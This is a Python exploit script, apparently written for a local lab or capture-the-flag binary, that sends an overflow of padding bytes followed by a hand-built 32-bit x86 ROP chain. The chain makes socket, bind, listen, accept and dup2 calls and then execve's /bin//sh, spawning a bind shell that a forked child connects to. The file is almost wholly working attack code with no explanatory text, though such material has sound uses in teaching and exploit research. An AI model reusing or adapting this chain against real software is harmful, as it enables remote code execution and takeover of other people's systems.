#!/usr/bin/env python

from struct import pack
from console import console
import socket
import sys
import time
import os

if len(sys.argv) != 3:
   	sys.exit("Usage: %s PORT CONNECT_PORT" % sys.argv[0])

def send_cmd(cmd1, cmd2):
    	port = int(sys.argv[1])
    	sock = socket.create_connection(('127.0.0.1', port),
                                    	socket.getdefaulttimeout(),
                                    	('127.0.0.1', 0))

    	sock.sendall(cmd1)

    #while True:
    #	 buf = sock.recv(1024)
    # 	 if not buf:
    #		break
    #    	sys.stdout.write(buf)
    #sock.close()
    	time.sleep(1)
    	sock.sendall(cmd2)
    	buf = sock.recv(4096)
    	sys.stdout.write(buf)
   	sys.stdout.flush()
	os.waitpid(child_pid, 0)
    	sock.close()

def bindConnect():
    	port = int(sys.argv[2])
    	bSock = socket.create_connection(('127.0.0.1', port), 
				     	socket.getdefaulttimeout(),
				     	('127.0.0.1', 0))
    	console(bSock);
   	while True:
		buf = bSock.recv(4096)		
		sys.stdout.flush()
		if not buf:
			break

def parent():

	#first command of 1023 chars
	cmd1 = ""
	pad = "a"

	for x in range(0, 1023):
		cmd1 = "".join((cmd1, pad))

	#second command of 29 to reach 1052 and start writing first gadget's address
	p = ""

	for x in range(0, 29):
		p = "".join((p, pad))


	#socket(int, int, int);
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x08139060) # @ .data
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x2)	    # PF_INET = AF_INET
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x08139064) # @ .data + 4
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x1)	    # SOCK_STREAM
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x08139068) # @ .data + 8
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x6)	    # IPPROTO_TCP
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0812b35b) # pop ecx ; ret
	p += pack('<I', 0x08139060) # @ .data
	p += pack('<I', 0x080481e1) # pop ebx ; ret
	p += pack('<I', 0x1)	    # SYS_SOCKET
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x66)	    # 0x66 <-> sys_socketcall
	p += pack('<I', 0x08085cc0) # int 0x80 ; ret

	#bind(int, const struct sockaddr *, socklen_t)
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x0813906c) # @ .data + 12
	#eax has the socket value
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x08139070) # @ .data + 16
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x08139078) # @ .data + 24
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x08139074) # @ .data + 20
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x10)	    # 16
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x08139078) # @ .data + 24
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x2) 	    # AF_INET
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x0813907a) # @ .data + 26
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', socket.htons(int(sys.argv[2]))) # htons(connect_port)
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x0813907c) # @ .data + 28
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += socket.inet_aton('127.0.0.1') # inet_aton(localhost)
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret

	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x66) # 0x66 <-> sys_socketcall
	p += pack('<I', 0x080481e1) # pop ebx ; ret
	p += pack('<I', 0x2)	    # SYS_SOCKET
	p += pack('<I', 0x0812b35b) # pop ecx ; ret
	p += pack('<I', 0x0813906c) # @ .data + 12
	p += pack('<I', 0x08085cc0) # int 0x80 ; ret

	#listen(int, int)
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x08139080) # @ .data + 32
	p += pack('<I', 0x080481e1) # pop ebx ; ret
	p += pack('<I', 0x0813906c) # @ .data + 12
	p += pack('<I', 0x0812b35b) # pop ecx ; ret
	p += pack('<I', 0x0813906c) # @ .data + 12
	p += pack('<I', 0x080c203c) # cmp ecx, ebx ; jne 0x80c200f ; mov eax, dword ptr[ecx] ; pop ebx ; pop esi ; ret
	p += pack('<I', 0xdedcacca) # garbage
	p += pack('<I', 0xdedcacca) # garbage
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x08139084) # @ .data + 36
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x0813906c) # @ .data + 12, listen bklg
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret

	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x66) # 0x66 <-> sys_socketcall
	p += pack('<I', 0x080481e1) # pop ebx ; ret
	p += pack('<I', 0x4)	    # SYS_LISTEN
	p += pack('<I', 0x0812b35b) # pop ecx ; ret
	p += pack('<I', 0x08139080) # @ .data + 32
	p += pack('<I', 0x08085cc0) # int 0x80 ; ret

	#accept(int, sockaddr *, socklen_t *)
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x08139088) # @ .data + 40
	p += pack('<I', 0x080481e1) # pop ebx ; ret
	p += pack('<I', 0x0813906c) # @ .data + 12
	p += pack('<I', 0x0812b35b) # pop ecx ; ret
	p += pack('<I', 0x0813906c) # @ .data + 12
	p += pack('<I', 0x080c203c) # cmp ecx, ebx ; jne 0x80c200f ; mov eax, dword ptr[ecx] ; pop ebx ; pop esi ; ret
	p += pack('<I', 0xdedcacca) # garbage
	p += pack('<I', 0xdedcacca) # garbage
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x0813908c) # @ .data + 44
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x0) # @ .data + 52
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x08139090) # @ .data + 48
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x0)	    # 0
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x08139094) # @ .data + 52
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x0)	    # 0
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x08139096) # @ .data + 54
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x0)	    # 0
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x08139098) # @ .data + 56
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x0)	    # 0
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret

	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x66)       # 0x66 <-> sys_socketcall
	p += pack('<I', 0x080481e1) # pop ebx ; ret
	p += pack('<I', 0x5)	    # SYS_ACCEPT
	p += pack('<I', 0x0812b35b) # pop ecx ; ret
	p += pack('<I', 0x08139088) # @ .data + 40
	p += pack('<I', 0x08085cc0) # int 0x80 ; ret

	#sock is in eax, needed in ebx
	p += pack('<I', 0x080481e1) # pop ebx ; ret
	p += pack('<I', 0x0) 	    # 0
	p += pack('<I', 0x080831b3) # add ebx, eax ; lea esi, dword ptr [esi] ; xor eax, eax ; ret

	#dup2(sock, 0)
	p += pack('<I', 0x0812b35b) # pop ecx ; ret
	p += pack('<I', 0x0)	    # 0
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x3f)	    # 0x3f <-> dup2 
	p += pack('<I', 0x08085cc0) # int 0x80 ; ret

	#dup2(sock, 1)
	p += pack('<I', 0x0812b35b) # pop ecx ; ret
	p += pack('<I', 0x1)	    # 1
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x3f)	    # 0x3f <-> dup2 
	p += pack('<I', 0x08085cc0) # int 0x80 ; ret

	#dup2(sock, 2)
	p += pack('<I', 0x0812b35b) # pop ecx ; ret
	p += pack('<I', 0x2)	    # 2
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x3f)	    # 0x3f <-> dup2 
	p += pack('<I', 0x08085cc0) # int 0x80 ; ret

	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x08139060) # @ .data
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += '/bin'
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x08139064) # @ .data + 4
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += '//sh'
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x08139068) # @ .data + 8
	p += pack('<I', 0x08048ac1) # xor eax, eax ; ret
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080481e1) # pop ebx ; ret
	p += pack('<I', 0x08139060) # @ .data
	p += pack('<I', 0x0812b35b) # pop ecx ; ret
	p += pack('<I', 0x08139068) # @ .data + 8
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x08139068) # @ .data + 8
	p += pack('<I', 0x080f1015) # inc eax ; pop eax ; ret
	p += pack('<I', 0xb) # 11, execve syscall id
	p += pack('<I', 0x08074ded) # int 0x80

	send_cmd(cmd1, p)

def child():
	time.sleep(2)
	bindConnect()
	sys.exit(0)


child_pid = os.fork()

if(child_pid == 0):
	child()
	sys.exit(0)
else:
	parent()
	

# :vim set sw=4 ts=8 sts=8 expandtab:
